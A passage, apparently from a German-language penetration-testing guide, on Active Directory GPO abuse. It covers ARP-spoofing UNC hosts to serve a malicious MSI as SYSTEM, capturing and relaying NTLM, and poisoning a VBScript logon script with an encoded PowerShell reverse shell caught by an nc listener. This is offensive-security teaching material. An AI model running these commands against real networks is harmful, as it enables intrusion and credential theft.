python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Verknüpfen Sie das vorhandene GPO mit der Ziel-OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Wenn die verknüpfte GPO ein MSI über einen UNC-Pfad bereitstellt, ruft der Client es beim **Computerstart** ab und installiert es als **`NT AUTHORITY\SYSTEM`**. Indem du den referenzierten Host spoofst und ein schädliches MSI unter **demselben Share/Pfad/Namen** bereitstellst, kannst du `WriteGPLink` für die Ausführung von Code als SYSTEM nutzen, **ohne SYSVOL zu ändern**.

Wichtige Einschränkungen:

- **Das Timing ist entscheidend**: Der neue Link wird bei der Richtlinienaktualisierung erkannt (üblicherweise nach etwa 90 Minuten), aber **Software Installation** wird normalerweise erst beim **Neustart** ausgelöst.
- Windows Installer erfasst die Bereitstellung üblicherweise anhand des **`ProductCode`** des Pakets. Wenn das Produkt bereits installiert ist, wird die Bereitstellung möglicherweise übersprungen.
- Um eine Ablehnung durch den Installer zu vermeiden, passe das bösartige MSI so an, dass sein **`ProductCode`** und **`PackageCode`** mit denen des legitimen, von der GPO erwarteten Pakets übereinstimmen.
- Alte `.aas`-Ankündigungsdateien können in `SYSVOL` verbleiben. Überprüfe daher, ob die Bereitstellung noch aktiv aussieht, bevor du dich darauf verlässt.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map-UNC-Hijack -> NTLM-Capture / WebDAV-Relay

GPP-Laufwerkszuordnungen in `Drives.xml` veranlassen Benutzer, sich während der Anmeldung oder beim erneuten Verbinden am konfigurierten UNC-Pfad zu authentifizieren. Wenn du den referenzierten Host spoofst, kannst du **NetNTLMv2** abfangen. Lässt man SMB absichtlich fehlschlagen, versucht Windows es möglicherweise erneut über **WebDAV** und sendet **NTLM über HTTP**. Das lässt sich deutlich flexibler für Relays zu **LDAP(S)**, **AD CS** oder **SMB** nutzen.

#### Logon-/Startup-Script-UNC-Hijack

Dasselbe Muster gilt für UNC-gehostete Scripts, die in `SYSVOL` gefunden wurden:

- **Logon-Scripts** werden normalerweise im Kontext des **Benutzers** ausgeführt.
- **Startup-Scripts** werden normalerweise im Kontext des **Computers / SYSTEM** ausgeführt.

Wenn der Script-Pfad auf einen spoofbaren Hostnamen verweist, leite den UNC-Host um und stelle am erwarteten Speicherort Ersatzinhalte für das Script bereit.

## SYSVOL/NETLOGON-Logon-Script-Poisoning

Beschreibbare Pfade unter `\\<dc>\SYSVOL\<domain>\scripts\` oder `\\<dc>\NETLOGON\` ermöglichen die Manipulation von Logon-Scripts, die bei der Benutzeranmeldung über GPO ausgeführt werden. Dadurch erhältst du Codeausführung im Sicherheitskontext angemeldeter Benutzer.

### Logon-Scripts finden
- Prüfe die Benutzerattribute auf ein konfiguriertes Logon-Script:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Durchsuche Domänenfreigaben, um Verknüpfungen oder Verweise auf Skripte aufzuspüren:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk`-Dateien parsen, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick für Angreifer ohne direkten GPO-Zugriff):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound zeigt das Attribut `scriptPath` des Benutzerobjekts für das Anmeldeskript an, sofern vorhanden. In GPO konfigurierte Anmeldeskripte sind eine separate Richtlinienreferenz. Untersuche daher auch die entsprechende GPO.

### Schreibzugriff validieren (Share-Auflistungen nicht vertrauen)
Automatisierte Tools zeigen SYSVOL/NETLOGON möglicherweise als schreibgeschützt an, obwohl die genaue Skriptdatei eine andere NTFS-ACL hat. Beginne mit einer schreibgeschützten Prüfung dieser Datei und ihres übergeordneten Verzeichnisses. Passende Allow-ACEs bleiben mögliche Kandidaten, da der effektive SMB- und NTFS-Zugriff, Deny-ACEs und das aktuelle Token relevant sind:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Ein autorisierter Schreibtest sollte zielsystemspezifisch und reversibel sein; das ursprüngliche Skript sollte gesichert und wiederhergestellt werden. Überschreibe kein funktionierendes Logon-Skript nur, um den Zugriff zu testen: Ein erfolgreicher Schreibzugriff kann beim nächsten Logon eines Benutzers ausgeführt werden.

### Ein VBScript-Logon-Skript für RCE vergiften
Füge einen Befehl hinzu, der eine PowerShell-reverse shell startet (auf revshells.com generieren), und behalte die ursprüngliche Logik bei, damit die Geschäftsfunktion nicht beeinträchtigt wird:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Lausche auf deinem Host und warte auf die nächste interaktive Anmeldung:

```bash
rlwrap -cAr nc -lnvp 443
```

Hinweise:
- Die Ausführung erfolgt unter dem Token des protokollierenden Benutzers (nicht SYSTEM). Der GPO-Link (OU, Standort, Domäne), der das Skript anwendet, bestimmt den Geltungsbereich.
- Nach der Verwendung den ursprünglichen Inhalt und die Zeitstempel wiederherstellen.

## References

- [1] [Missbrauch von Active Directory-ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegierte Konten und Token-Privilegien](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Das ACL-Angriffspfad-Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights-Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Privilegieneskalation mit ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Nach Active Directory-Berechtigungen und privilegierten Konten suchen](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule-Konstruktor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-Attribut-/UAC-Operationen unter Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (Gruppenmitgliedschaft)](https://www.samba.org/)
- [10] [HTB Puppy: Missbrauch von AD-ACLs, Knacken von KeePassXC Argon2 und DPAPI-Entschlüsselung bis zum DC-Admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking von GPO-UNC-Pfaden für Codeausführung und NTLM-Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: Ausnutzen von Active Directory-GPOs durch NTLM-Relaying und mehr](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Ausnutzen versteckter ACL-Angriffsvektoren in Organisationseinheiten in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation legitimer Active Directory-Dienste im Netzwerk: der Fall der GPO-Ausnutzung](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — OU-Bewegung und Missbrauch vererbter ACLs](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
